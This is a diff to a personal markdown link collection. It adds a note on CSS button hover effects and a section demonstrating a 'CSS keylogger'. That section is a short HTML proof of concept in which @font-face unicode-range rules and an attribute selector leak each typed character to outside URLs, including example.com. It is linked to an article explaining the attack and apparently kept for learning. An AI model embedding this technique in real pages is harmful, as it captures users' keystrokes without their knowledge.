@@ -217,6 +217,30 @@ https://coupon.codelabo.cn/
 https://juejin.cn/post/7049923513318604813
 
 
-###
+### hover style
 
 https://freebiesupply.com/blog/css-button-hover-effects/
+
+
+### css 键盘记录器
+
+```html
+<!doctype html>
+<!-- <meta http-equiv="content-security-policy" content="default-src 'self' 'unsafe-inline';;"> -->
+<title>css keylogger</title>
+<style>
+@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?a);  unicode-range: U+61; }
+@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?b);  unicode-range: U+62; }
+@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?c);  unicode-range: U+63; }
+@font-face { font-family: x; src: url(https://vipcdn.mgtv.com/upload/20180408/close.png?d);  unicode-range: U+64; }
+input { font-family: 'x', 'Comic sans ms'; }
+</style>
+<input value="a">type `bcd` and watch network log
+
+
+<style>
+  input[value="a"] { background: url(https://example.com/?value=a); }
+</style>
+
+```
+https://scotthelme.co.uk/can-you-get-pwned-with-css/
